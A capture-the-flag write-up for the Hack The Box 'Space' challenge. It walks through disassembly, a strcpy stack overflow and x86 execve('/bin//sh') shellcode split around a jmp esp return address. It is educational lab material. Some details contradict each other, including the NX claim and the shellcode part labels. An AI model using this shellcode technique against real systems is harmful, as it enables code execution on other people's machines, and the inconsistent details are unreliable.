# Space

This challenge was an easy shellcoding based challenge wherein the constraints were length. We had to cleverly make use of a shellcode in order to spawn the shell. To understand better, let's dive right in!

## Preliminary analysis on the binary:
- file:

![file](https://github.com/shravya-bhaskara/shravya-bhaskara.github.io/blob/main/pwn/hack%20the%20box/space/Screenshot%20from%202021-10-14%2013-03-54.png)

- permissions:

![permissions](https://github.com/shravya-bhaskara/shravya-bhaskara.github.io/blob/main/pwn/hack%20the%20box/space/Screenshot%20from%202021-10-14%2013-05-08.png)

As we can NX is enabled. Rop is another way to approach and solve this problem, however we shall make use of the shellcode as the stack is already executable in nature. 

## Approach:
To state the obvious, we will need an execve shellcode to pop out a shell! However we must look into the binary given and find out the vulnerability!

Below is the disassembly for main():
```   
   0x080491da <+11>:	mov    ebp,esp
   0x080491dc <+13>:	push   ebx
   0x080491dd <+14>:	push   ecx
   0x080491de <+15>:	sub    esp,0x20
   0x080491e1 <+18>:	call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491e6 <+23>:	add    ebx,0x20de
   0x080491ec <+29>:	sub    esp,0xc
   0x080491ef <+32>:	lea    eax,[ebx-0x12bc]
   0x080491f5 <+38>:	push   eax
   0x080491f6 <+39>:	call   0x8049040 <printf@plt>
   0x080491fb <+44>:	add    esp,0x10
   0x080491fe <+47>:	mov    eax,DWORD PTR [ebx-0x4]
   0x08049204 <+53>:	mov    eax,DWORD PTR [eax]
   0x08049206 <+55>:	sub    esp,0xc
   0x08049209 <+58>:	push   eax
   0x0804920a <+59>:	call   0x8049050 <fflush@plt>
   0x0804920f <+64>:	add    esp,0x10
   0x08049212 <+67>:	sub    esp,0x4
   0x08049215 <+70>:	push   0x1f
   0x08049217 <+72>:	lea    eax,[ebp-0x27]
   0x0804921a <+75>:	push   eax
   0x0804921b <+76>:	push   0x0
   0x0804921d <+78>:	call   0x8049030 <read@plt>
   0x08049222 <+83>:	add    esp,0x10
   0x08049225 <+86>:	sub    esp,0xc
   0x08049228 <+89>:	lea    eax,[ebp-0x27]
   0x0804922b <+92>:	push   eax
   0x0804922c <+93>:	call   0x80491a4 <vuln>
   0x08049231 <+98>:	add    esp,0x10
   0x08049234 <+101>:	mov    eax,0x0
   0x08049239 <+106>:	lea    esp,[ebp-0x8]
   0x0804923c <+109>:	pop    ecx
```
As we can see, the size of the stack is 0x20, whereas only 0x1f bytes of input data are read! Which means there is no possibility of an overflow. However a look into the vuln() function shows:

```
   0x080491a4 <+0>:	push   ebp
   0x080491a5 <+1>:	mov    ebp,esp
   0x080491a7 <+3>:	push   ebx
   0x080491a8 <+4>:	sub    esp,0x14
   0x080491ab <+7>:	call   0x8049243 <__x86.get_pc_thunk.ax>
   0x080491b0 <+12>:	add    eax,0x2114
   0x080491b5 <+17>:	sub    esp,0x8
   0x080491b8 <+20>:	push   DWORD PTR [ebp+0x8]
   0x080491bb <+23>:	lea    edx,[ebp-0xe]
   0x080491be <+26>:	push   edx
   0x080491bf <+27>:	mov    ebx,eax
   0x080491c1 <+29>:	call   0x8049060 <strcpy@plt>
   0x080491c6 <+34>:	add    esp,0x10
   0x080491c9 <+37>:	nop
   0x080491ca <+38>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080491cd <+41>:	leave  
   0x080491ce <+42>:	ret 
   ```
   From the above snippet of the disassembly of vuln(), we can see that strcpy() is being used and therefore we can overrwite eip to get a shell. 
   
   To find the buffer size before eip, we shall give a random input buffer of length 0x1f. 
   ```buf = cyclic(0x1e)```
   
   ![context](https://github.com/shravya-bhaskara/shravya-bhaskara.github.io/blob/main/pwn/hack%20the%20box/space/Screenshot%20from%202021-10-14%2014-31-54.png)

   In the above snippet, for our inp = "aaaabaaacaaadaaaeaaafaaagaaaha", segfault occurs at ```0x61666161```. i.e eip is located after 18 bytes of input data.
   
   The total size of our input is only 31 bytes. Which means, we need to split a shellcode in such a way that the first part of the shellcode compromizes the last 9 bytes of our input data. The second part of our shellcode must account for the first 18 bytes of input data.
   
   This can be further explained as:
   Consider the shellcode:
   ```
      31 c9                   xor    ecx, ecx
      31 d2                   xor    edx, edx
      52                      push   edx
      68 2f 2f 73 68          push   0x68732f2f
      68 2f 62 69 6e          push   0x6e69622f
      89 e3                   mov    ebx, esp
      6a 0b                   push   0xb
      58                      pop    eax
      cd 80                   int    0x80
   ```
The above shellcode is for an x86 execve syscall. We are required to split the shellcode in such a way that:
   - first 18 bytes: part1 of shellcode
   - return address (eip) : jmp esp
   - remaining 9 bytes: part2 of shellcode
      
   ## Splitting the shellcode:
   
   ```
   shell1 = 'xor ecx, ecx\n'
   shell1 += 'xor edx, edx\n'
   shell1 += 'sub esp, 0x16\n'
   shell1 += 'call eax\n'
   shell1 = asm(shell1)

   shell2 = 'push edx\n'
   shell2 += 'push 0x68732f2f\n'
   shell2 += 'push 0x6e69622f\n'
   shell2 += 'mov ebx, esp\n'
   shell2 += 'push 0xb\n'
   shell2 += 'pop eax\n'
   shell2 += 'int 0x80\n'
   shell2 = asm(shell2)
```

  - len(shell1) = 9 and len(shell2) = 18
  - While giving input it is essential that the last 9 bytes are executed along with the first 18! Thus a ```jmp``` to ```esp``` after the first 18 bytes i.e overwriting ```eip``` with ```jmp_esp``` instruction would make sure the smooth execution of our shellcode.

